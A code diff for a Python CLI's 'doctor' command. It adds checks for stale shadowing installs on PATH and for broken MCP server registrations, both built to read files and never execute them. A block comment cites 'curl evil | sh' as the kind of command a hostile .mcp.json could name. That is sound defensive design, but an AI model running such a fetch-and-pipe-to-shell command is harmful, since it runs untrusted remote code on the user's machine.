@@ -26,6 +26,7 @@ import errno
 import importlib.util
 import json
 import os
+import shutil
 import sqlite3
 import sys
 import tempfile
@@ -1742,6 +1743,355 @@ def _check_freshness(args: argparse.Namespace) -> Optional[tuple[str, str]]:
     return ("WARN", f"index is degraded/stale ({detail})")
 
 
+# ---------------------------------------------------------------------------
+# install identity (issue #104)
+#
+# One rule sits behind this check and the MCP one below, learned three times in
+# the field: A DIAGNOSTIC MUST NOT REPORT HEALTH IT CANNOT VOUCH FOR. doctor
+# printed green checks while (a) the reader was running a DIFFERENT rekoll than
+# the one they had just installed - which cost us two false bug reports from a
+# careful tester, against fixes that had already shipped - and (b) an agent's
+# MCP server had never loaded at all, for a twelve-hour session. So every line
+# below states what it verified AND what it could not.
+#
+# NEVER EXECUTE ANYTHING THESE CHECKS FIND. Both of them inspect things an
+# attacker can choose: programs on PATH, and `.mcp.json`, which arrives with a
+# clone from whoever wrote the repo. Asking a stranger's binary for its version
+# by running it is the obvious implementation and a remote-code-execution
+# footgun. Every probe here is a FILE READ or a PATH lookup. Reading a file
+# cannot be escalated into running one. Do not "improve" that.
+# ---------------------------------------------------------------------------
+
+#: Console scripts this package installs - the names another copy of rekoll
+#: would answer to if it sat earlier on PATH than this one.
+_CONSOLE_SCRIPTS = ("rekoll", "rekoll-mcp")
+
+#: Bounds. A diagnostic walks attacker-influenced directories and reads
+#: attacker-writable files, so every loop and every read is capped: PATH
+#: entries scanned, copies probed, and bytes pulled off any one file.
+_PATH_SCAN_LIMIT = 256
+_PROBE_FANOUT = 8
+_PROBE_READ_LIMIT = 8192
+_SHIM_READ_LIMIT = 512 * 1024
+
+#: Display caps for paths and versions read off this machine (the
+#: ``_MAX_DISPLAY_PART`` rule, applied to the filesystem instead of the store).
+_MAX_DISPLAY_PATH = 160
+_MAX_DISPLAY_VERSION = 32
+
+
+def _read_version_py(version_py: Path) -> Optional[str]:
+    """``__version__`` parsed out of a ``_version.py`` as TEXT, never imported.
+
+    Bounded read: importing would execute the file (see the never-execute rule
+    above), and slurping it whole would let a hostile 2 GB ``_version.py`` take
+    doctor down instead.
+    """
+    try:
+        with version_py.open("r", encoding="utf-8", errors="replace") as handle:
+            body = handle.read(_PROBE_READ_LIMIT)
+    except OSError:
+        return None
+    for line in body.splitlines():
+        stripped = line.strip()
+        if stripped.startswith("__version__"):
+            _, _, raw = stripped.partition("=")
+            return raw.strip().strip("\"'") or None
+    return None
+
+
+def _editable_source_dir(pth: Path) -> Optional[Path]:
+    """The source tree an editable-install ``.pth`` points at, if it names one.
+
+    setuptools writes either a bare directory path (this repo's ``src`` layout)
+    or an ``import __editable___..._finder`` line; only the first form is
+    resolvable by reading, and the second degrades to "editable, version
+    unreadable" rather than to a guess.
+    """
+    try:
+        with pth.open("r", encoding="utf-8", errors="replace") as handle:
+            body = handle.read(_PROBE_READ_LIMIT)
+    except OSError:
+        return None
+    for line in body.splitlines()[:8]:
+        text = line.strip()
+        if not text or text.startswith("import "):
+            continue
+        try:
+            candidate = Path(text)
+            if candidate.is_dir():
+                return candidate
+        except (OSError, ValueError):
+            continue
+    return None
+
+
+def _version_from_site_packages(site_packages: Path) -> tuple[Optional[str], bool]:
+    """``(version, is_editable)`` for the rekoll installed in ``site_packages``.
+
+    ``(None, False)`` means genuinely unknown, and is reported as unknown - the
+    whole point of this check is to stop claiming what it has not verified.
+    """
+    version_py = site_packages / "rekoll" / "_version.py"
+    if version_py.is_file():
+        return (_read_version_py(version_py), False)
+
+    editable = False
+    for pth in sorted(site_packages.glob("*rekoll*.pth"))[:_PROBE_FANOUT]:
+        editable = True
+        source = _editable_source_dir(pth)
+        if source is not None:
+            source_version = source / "rekoll" / "_version.py"
+            if source_version.is_file():
+                # An editable install RUNS the source tree, so the source is
+                # the honest answer. Its ``dist-info`` records only the version
+                # at install time and goes stale the moment someone bumps it -
+                # reporting that as a mismatch would cry wolf at every
+                # developer, every run.
+                return (_read_version_py(source_version), True)
+
+    dist_infos = sorted(site_packages.glob("rekoll-*.dist-info"))
+    if dist_infos:
+        name = dist_infos[-1].name
+        return (name[len("rekoll-"):-len(".dist-info")] or None, editable)
+    return (None, editable)
+
+
+def _interpreter_of_shim(exe: Path) -> Optional[Path]:
+    """The interpreter a console-script shim points at, read from its ``#!``
+    line as BYTES - never by running the shim.
+
+    Worth the trouble because ``pipx`` (what QUICKSTART recommends, and what
+    the #104 incident used) puts ``rekoll`` in ``~/.local/bin`` while the
+    package lives in ``~/.local/pipx/venvs/rekoll``: the ordinary
+    ``<env>/Scripts/rekoll.exe`` -> ``<env>/Lib/site-packages`` walk finds
+    nothing there. Windows launchers embed the same ``#!`` line a POSIX script
+    starts with, sandwiched between the launcher stub and the zip payload.
+    """
+    try:
+        with exe.open("rb") as handle:
+            blob = handle.read(_SHIM_READ_LIMIT)
+    except OSError:
+        return None
+    if blob.startswith(b"#!"):
+        start = 0
+    else:
+        zip_at = blob.find(b"PK\x03\x04")  # the payload a Windows launcher wraps
+        if zip_at < 0:
+            return None
+        start = blob.rfind(b"#!", 0, zip_at)
+        if start < 0:
+            return None
+    line = blob[start + 2:start + 2 + _PROBE_READ_LIMIT].split(b"\n", 1)[0]
+    text = line.decode("utf-8", errors="replace").strip().strip('"').strip()
+    if not text:
+        return None
+    try:
+        candidate = Path(text)
+        return candidate if candidate.is_file() else None
+    except (OSError, ValueError):
+        return None
+
+
+def _site_packages_for(exe: Path) -> list[Path]:
+    """Candidate ``site-packages`` directories for the environment that owns
+    ``exe``, best guess first."""
+    roots: list[Path] = []
+    interpreter = _interpreter_of_shim(exe)
+    if interpreter is not None:
+        parent = interpreter.parent
+        roots.append(parent.parent if parent.name.lower() in ("scripts", "bin") else parent)
+    roots.append(exe.parent.parent)  # the plain <env>/Scripts/rekoll.exe walk
+
+    out: list[Path] = []
+    seen: set[str] = set()
+    for root in roots:
+        try:
+            candidates = [
+                root / "Lib" / "site-packages",
+                root / "lib" / "site-packages",
+                *sorted(root.glob("lib/python3*/site-packages")),
+            ]
+        except OSError:
+            continue
+        for candidate in candidates:
+            key = str(candidate).lower()
+            if key in seen:
+                continue
+            seen.add(key)
+            try:
+                if candidate.is_dir():
+                    out.append(candidate)
+            except OSError:
+                continue
+    return out
+
+
+def _version_of_install(exe: Path) -> tuple[Optional[str], bool]:
+    """``(version, is_editable)`` for the rekoll that ``exe`` would import."""
+    editable_seen = False
+    try:
+        for site_packages in _site_packages_for(exe)[:_PROBE_FANOUT]:
+            version, editable = _version_from_site_packages(site_packages)
+            if version is not None:
+                return (version, editable)
+            editable_seen = editable_seen or editable
+    except Exception:  # a diagnostic never dies inspecting the filesystem
+        return (None, False)
+    return (None, editable_seen)
+
+
+def _rekoll_commands_on_path() -> list[Path]:
+    """Every ``rekoll``/``rekoll-mcp`` executable on PATH, in PATH order.
+
+    Deliberately more than ``shutil.which``: which() answers "what would run",
+    and the question that matters here is "how many DIFFERENT answers exist" -
+    exactly what let a stale copy shadow a fresh one in silence.
+    """
+    found: list[Path] = []
+    seen: set[str] = set()
+    if os.name == "nt":
+        exts = [e for e in os.environ.get("PATHEXT", ".EXE").split(os.pathsep) if e.strip()]
+    else:
+        exts = [""]
+    entries = [e for e in os.environ.get("PATH", "").split(os.pathsep) if e.strip()]
+    for entry in entries[:_PATH_SCAN_LIMIT]:
+        for stem in _CONSOLE_SCRIPTS:
+            for ext in exts:
+                try:
+                    candidate = Path(entry) / f"{stem}{ext.lower()}"
+                    if not candidate.is_file():
+                        continue
+                    if os.name != "nt" and not os.access(candidate, os.X_OK):
+                        continue
+                except (OSError, ValueError):
+                    continue  # an unreadable PATH entry is not a reason to fail
+                key = str(candidate).lower() if os.name == "nt" else str(candidate)
+                if key not in seen:
+                    seen.add(key)
+                    found.append(candidate)
+    return found
+
+
+def _running_env_root() -> Optional[Path]:
+    """The environment root of the rekoll executing RIGHT NOW, or ``None`` when
+    there isn't one to compare against (a source checkout on ``PYTHONPATH``, or
+    an editable install, has no ``<env>/Scripts`` of its own)."""
+    try:
+        parent = Path(__file__).resolve().parent.parent
+        if parent.name != "site-packages":
+            return None
+        root = parent.parent                       # <env>/Lib  or  <env>/lib/python3.X
+        if root.name.lower().startswith("python3"):
+            root = root.parent
+        return root.parent
+    except Exception:
+        return None
+
+
+def _display_one_line(value: object, limit: int = _MAX_DISPLAY_PATH) -> str:
+    """Attacker-choosable text (a path, a version string, a config field) made
+    safe to print on ONE doctor line.
+
+    ``_display_value`` (ADR-0040) already turns control characters into ``?``
+    and caps the length, which stops raw ESC and stops a forged NEW line. It is
+    not sufficient on its own here, and this was found by attacking this very
+    check: doctor formats its report in columns (``  WARN  mcp   ...``), so
+    text that merely survives as printable ASCII can still contain
+    ``"  ok    firewall   totally fine"`` verbatim, and pad with spaces until a
+    wrapping terminal starts a visual line on it. That is precisely the
+    pad-to-terminal-width forgery the scope-split note's conservative alphabet
+    was built to stop. Collapsing every whitespace run to a single space keeps
+    legitimate paths readable (``C:\\Program Files\\...``) while making the
+    column layout unforgeable.
+    """
+    return _display_value(" ".join(str(value).split()), limit=limit)
+
+
+def _describe_copy(exe: Path, version: Optional[str], editable: bool) -> str:
+    """One other copy of rekoll, rendered safely.
+
+    Paths and versions are read off this machine, so they are display DATA: a
+    non-ASCII username alone would break this module's ASCII-only rule, and a
+    crafted directory name could otherwise smuggle escapes into doctor's
+    output.
+    """
+    where = _display_one_line(exe)
+    if version is None:
+        return f"{where} (version unreadable)"
+    shown = _display_one_line(version, limit=_MAX_DISPLAY_VERSION)
+    return f"{where} (v{shown}, editable checkout)" if editable else f"{where} (v{shown})"
+
+
+def _check_install() -> tuple[str, str]:
+    """Which rekoll is this, and could a different one answer when you type
+    ``rekoll``? (issue #104)
+
+    The field failure: a stale 0.1.1 sat earlier on PATH than a freshly
+    installed 0.1.3, so a careful tester filed two bug reports against code
+    they were not running - both already fixed in the version they believed
+    they had. doctor printed the true version the whole time, as ``ok``, which
+    nobody reads as a warning, and said nothing about the other copies.
+
+    WARN, never FAIL: nothing is broken, and warn-don't-restrict means doctor
+    informs and hands over the fix rather than blocking. Fail-soft on every
+    axis - any inspection error degrades to the plain identity line.
+    """
+    running = _display_value(__version__, limit=_MAX_DISPLAY_VERSION)
+    identity = f"{running} at {_display_value(Path(__file__).resolve().parent, limit=_MAX_DISPLAY_PATH)}"
+    try:
+        others = _rekoll_commands_on_path()
+    except Exception:
+        return ("ok", identity)
+    if not others:
+        # e.g. `python -m rekoll` from a checkout: nothing can shadow it.
+        return ("ok", f"{identity} (no 'rekoll' command on PATH - running as a module)")
+
+    probed = [(exe, *_version_of_install(exe)) for exe in others[:_PROBE_FANOUT]]
+    # Only copies whose version was actually READ can disagree. Unreadable is
+    # never counted as agreement OR disagreement.
+    offenders = [row for row in probed if row[1] is not None and row[1] != __version__]
+
+    if offenders:
+        listed = ", ".join(_describe_copy(*row) for row in offenders[:3])
+        if len(offenders) > 3:
+            listed += f", and {len(offenders) - 3} more"
+        return (
+            "WARN",
+            f"this is rekoll {identity}, but PATH also has {listed} - typing "
+            "'rekoll' may run the OTHER one, so a fix you installed may not be "
+            "the code you are testing. Uninstall the stale copy (pip uninstall "
+            "rekoll) or fix PATH order, then re-run doctor",
+        )
+
+    # Versions agree; does the copy that WINS a bare lookup even live here?
+    running_root = _running_env_root()
+    first = next((exe for exe in others if exe.stem.lower() == "rekoll"), None)
+    if first is not None and running_root is not None:
+        try:
+            if running_root not in first.resolve().parents:
+                version, editable = _version_of_install(first)
+                return (
+                    "WARN",
+                    f"this is rekoll {identity}, but the 'rekoll' command on "
+                    f"PATH is {_describe_copy(first, version, editable)} - a "
+                    "different install answers when you type 'rekoll'; make "
+                    "sure you are testing the copy you think you are",
+                )
+        except OSError:
+            pass
+
+    # Say exactly how much was verified. "all versions agree" would be a claim
+    # this check has not earned when the other copies were unreadable.
+    readable = sum(1 for _exe, version, _editable in probed if version is not None)
+    unreadable = len(probed) - readable
+    if unreadable:
+        parts = [f"{readable} match this version"] if readable else []
+        parts.append(f"{unreadable} could not be read")
+        return ("ok", f"{identity} (PATH has {len(probed)} rekoll command(s); {', '.join(parts)})")
+    return ("ok", f"{identity} (PATH has {len(probed)} rekoll command(s), all {running})")
+
+
 def _check_scopes(args: argparse.Namespace) -> Optional[tuple[str, str]]:
     """The split detector (issue #83 / ADR-0040) as a doctor line: a store
     whose memories all sit under OTHER scopes must never let doctor reassure
@@ -1798,6 +2148,199 @@ def _check_scopes(args: argparse.Namespace) -> Optional[tuple[str, str]]:
     return ("ok", "no memories hide under another scope in this store")
 
 
+# ---------------------------------------------------------------------------
+# MCP registration (issue #84)
+#
+# The never-execute rule stated above the install check applies here with teeth:
+# `.mcp.json` is REPO-CONTROLLED data. It arrives with a clone, written by
+# whoever wrote the repo, and a hostile one can name any command it likes
+# ("curl evil | sh"). Launching what it points at to "see if it works" would
+# turn doctor into an arbitrary-code-execution primitive. These checks may only
+# STAT a path or SEARCH PATH, and everything they render goes through
+# `_display_value` first, because a config that can forge doctor's own output
+# lines is a config that can talk the operator into running something.
+# ---------------------------------------------------------------------------
+
+#: Client config files that can register an MCP server for THIS project.
+#: Project-local only, on purpose: doctor must not go hunting through a home
+#: directory for editor configs it cannot reliably interpret. A file that is
+#: absent is simply not reported.
+_MCP_CLIENT_CONFIGS = (".mcp.json", ".cursor/mcp.json", ".vscode/mcp.json")
+
+#: Bounds, for the same reason the install check has them.
+_MCP_CONFIG_READ_LIMIT = 512 * 1024
+_MCP_MAX_ENTRIES = 8
+_MCP_MAX_ARGS = 64
+_MCP_MAX_PROBLEMS = 3
+
+
+def _display_config_value(value: object) -> str:
+    """A field read out of an MCP client config, made safe to print.
+
+    Same guard as the paths in the install check (:func:`_display_one_line`),
+    for a stronger reason: a store file has at least to be committed as a
+    binary, while ``.mcp.json`` is human-authored text that arrives with any
+    clone.
+    """
+    return _display_one_line(value, limit=_MAX_DISPLAY_PATH)
+
+
+def _find_mcp_registrations() -> tuple[list[tuple[str, str, dict]], list[str]]:
+    """``(registrations, unreadable)`` from project-local MCP client configs.
+
+    ``registrations`` is ``(config_file, server_key, entry)`` for rekoll
+    servers. ``unreadable`` names configs that EXIST but could not be parsed -
+    a hand-edited config with a trailing comma is invalid JSON, so the client
+    silently starts no server at all, which is precisely the silence this check
+    exists to break. Reporting it beats swallowing it.
+
+    Fail-soft otherwise: a missing config is absent, a ``.mcp.json`` that is
+    somehow a directory is absent, and a diagnostic never dies reading a file.
+    """
+    out: list[tuple[str, str, dict]] = []
+    unreadable: list[str] = []
+    for name in _MCP_CLIENT_CONFIGS:
+        try:
+            path = Path(name)
+            if not path.is_file():
+                continue
+            with path.open("r", encoding="utf-8", errors="replace") as handle:
+                body = handle.read(_MCP_CONFIG_READ_LIMIT + 1)
+        except (OSError, ValueError):
+            continue
+        if len(body) > _MCP_CONFIG_READ_LIMIT:
+            unreadable.append(f"{name} is too large to check")
+            continue
+        try:
+            data = json.loads(body)
+        except json.JSONDecodeError as exc:
+            unreadable.append(
+                f"{name} is not valid JSON ({_display_config_value(exc.msg)} "
+                f"at line {exc.lineno})"
+            )
+            continue
+        except Exception:
+            continue
+        if not isinstance(data, dict):
+            unreadable.append(f"{name} is not a JSON object")
+            continue
+        # Claude Code and Cursor use "mcpServers"; VS Code uses "servers".
+        servers = data.get("mcpServers") or data.get("servers")
+        if not isinstance(servers, dict):
+            continue
+        for key, entry in list(servers.items())[:_MCP_MAX_ENTRIES]:
+            if not isinstance(entry, dict):
+                continue
+            command = entry.get("command")
+            command = command.lower() if isinstance(command, str) else ""
+            arg_list = entry.get("args")
+            blob = " ".join(str(a) for a in arg_list[:_MCP_MAX_ARGS]) if isinstance(arg_list, list) else ""
+            if "rekoll" in str(key).lower() or "rekoll" in command or "rekoll" in blob.lower():
+                out.append((name, str(key), entry))
+    return (out, unreadable)
+
+
+def _mcp_command_problem(entry: dict) -> Optional[str]:
+    """Why this registration's ``command`` cannot be found, or ``None``.
+
+    EXISTENCE ONLY - never execution (see the block comment above). This is the
+    check that would have caught the rename incident: ``.mcp.json`` pointed at
+    a console-script shim under the OLD folder name, every session lost its
+    rekoll tools, and doctor stayed green.
+    """
+    raw = entry.get("command")
+    if not isinstance(raw, str) or not raw.strip():
+        return "it names no command"
+    command = raw.strip()
+    try:
+        candidate = Path(command)
+        if candidate.name == command:  # a bare name is resolved via PATH
+            if shutil.which(command):
+                return None
+            return f"'{_display_config_value(command)}' is not on PATH"
+        if candidate.expanduser().is_file():
+            return None
+        return f"{_display_config_value(command)} does not exist"
+    except (OSError, ValueError):
+        return f"{_display_config_value(command)} could not be checked"
+
+
+def _mcp_store_problem(entry: dict) -> Optional[str]:
+    """Why this registration's pinned ``--path`` store can never be written, or
+    ``None``.
+
+    A store file that does not exist yet is NORMAL - the server creates it on
+    the first write, and warning about it would nag every new user. A missing
+    FOLDER is the rename signature: the location the agent had been writing to
+    is gone, and nothing can be created there.
+    """
+    arg_list = entry.get("args")
+    if not isinstance(arg_list, list):
+        return None
+    pinned = None
+    for i, value in enumerate(arg_list[:_MCP_MAX_ARGS]):
+        if str(value) == "--path" and i + 1 < len(arg_list):
+            pinned = str(arg_list[i + 1])
+            break
+    if pinned is None or pinned == ":memory:":
+        return None
+    try:
+        target = Path(pinned).expanduser()
+        if target.exists() or target.parent.exists():
+            return None
+    except (OSError, ValueError):
+        return None
+    return f"--path {_display_config_value(pinned)} is in a folder that does not exist"
+
+
+def _check_mcp() -> Optional[tuple[str, str]]:
+    """Is the MCP door actually wired up? (issue #84)
+
+    Two field incidents. A valid ``.mcp.json`` sat in a repo whose client had
+    never loaded it, and a twelve-hour agent session ran with no rekoll tools
+    while doctor printed nine green checks and never mentioned MCP at all.
+    Then a folder rename left the config pointing at paths that no longer
+    existed - and again, nothing said so.
+
+    Returns ``None`` (no line) when no project-local registration exists:
+    plenty of people use only the CLI, and doctor must not nag them about a
+    door they never opened. WARN, never FAIL - a broken registration does not
+    break the CLI you are typing into.
+    """
+    try:
+        registrations, unreadable = _find_mcp_registrations()
+    except Exception:  # a diagnostic never dies reading a config file
+        return None
+    problems: list[str] = list(unreadable)
+    for name, key, entry in registrations:
+        problem = _mcp_command_problem(entry) or _mcp_store_problem(entry)
+        if problem is not None:
+            problems.append(f"{name} ({_display_config_value(key)}): {problem}")
+    if not registrations and not problems:
+        return None
+    if problems:
+        shown = "; ".join(problems[:_MCP_MAX_PROBLEMS])
+        if len(problems) > _MCP_MAX_PROBLEMS:
+            shown += f", and {len(problems) - _MCP_MAX_PROBLEMS} more"
+        return (
+            "WARN",
+            f"{shown} - so an MCP client starts no rekoll server and your agent "
+            "gets no rekoll tools (this breaks silently after a folder rename; "
+            "a 'python -m rekoll.mcp_server' command survives one)",
+        )
+    where = ", ".join(sorted({name for name, _key, _entry in registrations}))
+    # The honest limit of what a config check can know. In the twelve-hour
+    # incident every one of these facts was TRUE and the server still never
+    # ran, so an unqualified "ok" here would repeat the original failure in a
+    # new place: reporting health doctor cannot actually see.
+    return (
+        "ok",
+        f"{where} registers rekoll and what it points at exists - but doctor "
+        "cannot tell whether your client LOADED it (most need a restart or "
+        "approval after the config changes); ask your agent to list its tools",
+    )
+
+
 def cmd_doctor(args: argparse.Namespace) -> int:
     _out("rekoll doctor - checking this machine")
     _out()
@@ -1805,7 +2348,11 @@ def cmd_doctor(args: argparse.Namespace) -> int:
 
     level, detail = _check_python()
     checks.append((level, "python", detail))
-    checks.append(("ok", "rekoll", f"{__version__} at {Path(__file__).resolve().parent}"))
+    # Identity FIRST among the things it could be wrong about (issue #104):
+    # every line below describes the copy this one names, so a reader who is
+    # running a different rekoll than they think needs to learn that here.
+    level, detail = _check_install()
+    checks.append((level, "rekoll", detail))
     if _semantic_extra_installed():
         checks.append(("ok", "semantic", "the 'embeddings' extra is installed - real semantic search"))
     else:
@@ -1825,6 +2372,9 @@ def cmd_doctor(args: argparse.Namespace) -> int:
     scopes = _check_scopes(args)  # the split detector (issue #83 / ADR-0040)
     if scopes is not None:
         checks.append((scopes[0], "scopes", scopes[1]))
+    mcp = _check_mcp()  # is the MCP door really wired up? (issue #84)
+    if mcp is not None:
+        checks.append((mcp[0], "mcp", mcp[1]))
     freshness = _check_freshness(args)  # Memory.health() seam (ADR-0024)
     if freshness is not None:
         checks.append((freshness[0], "freshness", freshness[1]))
